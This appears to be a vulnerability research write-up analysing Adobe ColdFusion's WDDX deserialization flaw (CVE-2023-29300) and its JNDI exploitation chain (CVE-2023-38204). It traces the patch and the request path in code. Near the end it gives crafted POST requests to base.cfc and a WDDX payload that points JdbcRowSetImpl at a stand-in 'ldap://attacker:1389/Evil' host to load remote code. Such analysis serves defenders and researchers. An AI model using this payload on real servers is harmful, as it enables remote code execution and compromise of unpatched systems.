# 0x01 Summary

Recently, Adobe ColdFusion released multiple security updates that caught our attention. Adobe ColdFusion is a Java-based commercial application server. On July 13, 2023, ProjectDiscovery published an analysis article, and through our research on CVE-2023-29300, we discovered an undisclosed and very interesting vulnerability. As of that date, no official security patch had been released, so we immediately started searching for new exploitation methods. Shortly after, ProjectDiscovery realized that they had disclosed a 0day vulnerability, promptly deleted the analysis article, and awaited the official security patch. The specific timeline for the vulnerability can be referred to in the following text.



The exploitation method disclosed by ProjectDiscovery is limited to JDK versions lower than 9. After testing, the success rate of the publicly disclosed JNDI exploitation chain was found to be 0.6%. It mentioned the use of commons-beanutils, but upon our analysis, we found that it was not necessary to use it, and there are other exploitation chains. This article will start by examining the content of the security update in ColdFusion 2023 Release Update 1, analyze the cause of CVE-2023-29300, and propose some follow-up research directions.



In Goby, we have integrated the JNDI exploitation chain (CVE-2023-38204) for CVE-2023-29300, enabling command execution and custom LDAP server address functionality. The demonstration effect is as follows:

# 0x03 Vulnerability Analysis

## 3.1 Patch Analysis

On July 12th, Adobe released ColdFusion (2023 release) Update 1. By comparing the decompiled code of the patch with the code before the update, a significant change can be observed in the `coldfusion.wddx.DeserializerWorker#startElement()` method: 

[![pPPhTeg.png](https://s1.ax1x.com/2023/08/02/pPPhTeg.png)](https://imgse.com/i/pPPhTeg)

The newly added `validateWddxFilter()` method is as follows.

```java
private void validateWddxFilter(AttributeList atts) throws InvalidWddxPacketException {
    String attributeType = atts.getValue("type");
    if (attributeType.endsWith(";")) {
        attributeType = attributeType.replace(";", "");
    }
    if (attributeType.startsWith("L")) {
        String attributeTypeCopy = attributeType;
        validateBlockedClass(attributeTypeCopy.replaceFirst("L", ""));
    }
    validateBlockedClass(attributeType);
}

private void validateBlockedClass(String attributeType) throws InvalidWddxPacketException {
    if (attributeType != null && !attributeType.toLowerCase().startsWith("coldfusion") && !attributeType.equalsIgnoreCase(StructTypes.ORDERED.getValue()) && !attributeType.equalsIgnoreCase(StructTypes.CASESENSITIVE.getValue()) && !attributeType.equalsIgnoreCase(StructTypes.ORDEREDCASESENSITIVE.getValue()) && WddxFilter.invoke(attributeType)) {
        throw new InvalidWddxPacketException();
    }
}
```



Based on the search of related documents, it is known that ColdFusion implements an ancient XML technology called WDDX (Web Distributed Data Exchange). By implementing WDDX, variables (including their names, data types, and values) can be serialized into an XML document, and applications can reconstruct these variables by deserializing this XML document.

## 3.2 WDDX Serialization

Various serializers that implement the `coldfusion.wddx.WddxObjectSerializer` interface can perform WDDX serialization on data. Examples of these serializers include `StringSerializer`, `NumberSerializer`, `BeanSerializer`, and others. We attempted to use the `BeanSerializer` to serialize a custom Java Bean, and during the debugging process, we also observed the default mapping relationship between object types and the serializer.。

[![pPPhqFs.png](https://s1.ax1x.com/2023/08/02/pPPhqFs.png)](https://imgse.com/i/pPPhqFs)

The format of the output serialization result is as follows.

```xml
<wddxPacket version='1.0'>
    <header/>
    <data>
        <struct type='LJavaBean;'>
            <var name='age'>
                <number>233.0</number>
            </var>
            <var name='name'>
                <string>233</string>
            </var>
        </struct>
    </data>
</wddxPacket>
```

Correspondingly, deserialization is implemented by the `coldfusion.wddx.WddxDeserializer` class. For ColdFusion, each element in WDDX is a `WddxElement`, and different elements correspond to different `Handler` processing classes. For example, elements and attributes in the `<string>` tag will be handled by `StringHandler`, and the `<struct>` tag will be handled by `StructHandler`. We are particularly interested in the `onStartElement()` and `onEndElement()` methods.

```java
public void onStartElement(String name, AttributeList attributes) throws WddxDeserializationException {
    this.m_strictType = attributes.getValue("type");
    //...
}
```

```java
public void onEndElement() throws WddxDeserializationException {
    if (this.m_strictType == null) {
        // ...
    } else {
        Class beanClass = null;
        Object bean = null;

        try {
            beanClass = getClassBySignature(this.m_strictType);
            bean = beanClass.getDeclaredConstructor().newInstance();
            this.setBeanProperties(bean, this.m_ht);
            this.setTypeAndValue(bean);
        } catch (Exception var6) {
            // ...
        }
    }
}
```

`onStartElement()` and `onEndElement()` are callback methods in the SAX parser (Simple API for XML), which are called when the parser encounters the start and end tags of XML elements, respectively. In the `onStartElement()` method, the `type` attribute of the `<struct>` tag is assigned to the variable `m_strictType`.

Now let's follow the `getClassBySignature()` method.

```java
private static Class getClassBySignature(String jniTypeSig) throws ClassNotFoundException {
    int index = 0;
    char c = jniTypeSig.charAt(index);
    String className;
    switch (c) {
        // ...
        default:
            className = jniTypeSig.substring(index + 1, jniTypeSig.length() - 1);
            return Class.forName(className);
        // ...
    }
}
```

Clearly, here the first two characters of the `type` attribute are removed, and the remaining string is treated as a class name. The `Class.forName()` method is then used to load the class, followed by calling its parameterless constructor in the `onEndElement()` method.

Next, in the `StructHandler#setBeanProperties()` method, there is an evident `Method#invoke()` operation, aiming to call the setter methods of the target object and assign values to the properties of the newly instantiated object. Due to the length of the code snippet, it is not provided here.

Based on the analysis so far, we can conclude that ColdFusion's WDDX serialization and deserialization mechanism is quite similar to FastJson. Both are based on the target object's getter and setter methods, which are automatically invoked during the serialization and deserialization process. Referring back to the security update, if the incoming `type` attribute is not filtered, it would be similar to the situation in FastJson version 1.2.24. Attackers can exploit this vulnerability to instantiate any class that has a parameterless constructor and further call its designated setter methods, with control over the parameters. Undoubtedly, this poses a risk for exploitation.

## 3.3 Parameter Analysis

To find the approach for passing in the serialization payload and triggering deserialization, we globally search for references to the `WddxDeserializer#deserialize()` method in Jadx, and then follow through to `coldfusion.filter.FilterUtils#WDDXDeserialize()`.

```java
public static Object WDDXDeserialize(String str) throws Throwable {
    WddxDeserializer deserializer = new WddxDeserializer();
    InputSource source = new InputSource(new StringReader(str));
    return deserializer.deserialize(source);
}
```

Continuing the search for references to `WDDXDeserialize()`, we follow through to `FilterUtils#GetArgumentCollection()`.

```java
public static Map GetArgumentCollection(FusionContext context) throws Throwable {
    ServletRequest request = context.request;
    String attr = (String)context.pageContext.findAttribute("url.argumentCollection");
    if (attr == null) {
        attr = (String)context.pageContext.findAttribute("form.argumentCollection");
    }

    Struct argumentCollection;
    if (attr == null) {
        // ...
    } else {
        attr = attr.trim();
        if (attr.charAt(0) == '{') {
            // ...
        } else {
            argumentCollection = (Struct)WDDXDeserialize(attr);
        }
    }
    // ...
    return argumentCollection;
}

```

Analysis of the `findAttribute()` method reveals that the parameter `url.xxx` indicates retrieving the value of the parameter `xxx` from the request URL, while `form.yyy` indicates obtaining the value of parameter `yyy` from the uploaded form.

Continuing to trace upwards, we finally locate the `coldfusion.filter.ComponentFilter#invoke()` method.

`ComponentFilter` is a filter that inherits from the abstract class `FusionFilter`. Since it is related to filters, the first step would be to check the web.xml configuration file.

```xml
<servlet-mapping id="coldfusion_mapping_4">
    <servlet-name>CFCServlet</servlet-name>
    <url-pattern>*.cfc</url-pattern>
</servlet-mapping>
```

It is known that the Servlet responsible for parsing .cfc pages is named `CFCServlet`.

Following through to the `getCFCFilterChain()` method of `CFCServlet`.

```java
private FusionFilter getCFCFilterChain(ServletRequest request) {
	FusionFilter filter = new ComponentFilter();
	FusionFilter filter = new ApplicationFilter(filter, 3);
	// ...
	FusionFilter filter = new MonitoringFilter((FusionFilter)filter, "CFC REQUEST");
	filter = new PathFilter(filter, this);
	// ...
	FusionFilter filter = new ExceptionFilter((FusionFilter)filter);
	FusionFilter filter = new ClientScopePersistenceFilter(filter);
	FusionFilter filter = new BrowserFilter(filter);
	FusionFilter filter = new NoCacheFilter(filter);
	boolean needsFormScope = true;
	FusionFilter filter = new GlobalsFilter(filter, true);
	FusionFilter filter = new DatasourceFilter(filter);
	return filter;
}
```

Its returned Filter Chain includes `ComponentFilter`.

It is important to note that `PathFilter` checks if the target file being accessed exists, so we cannot access a .cfc file that does not exist on the server.

Based on this, we attempt to construct the following packet and follow through to the `ComponentFilter#invoke()` method: 

```
POST /CFIDE/adminapi/base.cfc HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 365
Content-Type: application/x-www-form-urlencoded

argumentCollection=/* payload */
```

[![pPPhxyT.png](https://s1.ax1x.com/2023/08/02/pPPhxyT.png)](https://imgse.com/i/pPPhxyT)

There is an `if` condition here that checks if the `method` parameter is not passed. If the `method` parameter is missing, it will prematurely return a 302 response, cutting off our attack path.

Therefore, we also need to include the `method` parameter in our request.

```
POST /CFIDE/adminapi/base.cfc?method HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 365
Content-Type: application/x-www-form-urlencoded

argumentCollection=/* payload */
```

This way, we can bypass the `if` condition and call the `GetArgumentCollection()` method to pass the serialized malicious data to the server.

# 0x04 Exploitation

Therefore, drawing a parallel with FastJson, it is conceivable to construct a JNDI exploitation chain by invoking the `setDataSourceName` and `setAutoCommit` setter methods of the `JdbcRowSetImpl` class. This exploitation chain is assigned the CVE number CVE-2023-38204.

```xml
<wddxPacket version='1.0'>
    <header/>
    <data>
        <struct type='xcom.sun.rowset.JdbcRowSetImplx'>
            <var name='dataSourceName'>
                <string>ldap://attacker:1389/Evil</string>
            </var>
            <var name='autoCommit'>
                <boolean value='true'/>
            </var>
        </struct>
    </data>
</wddxPacket>
```

[![pPP4pmF.png](https://s1.ax1x.com/2023/08/02/pPP4pmF.png)](https://imgse.com/i/pPP4pmF)

We noticed that there are numerous JAR files in the WEB-INF/bundles and its subfolders, including the "repo" directory. Based on the assumption that "existence implies reasonableness," we added all JAR files to the working environment. With this setup, we continued exploring new exploitation chains and successfully developed a new limited exploitation method.
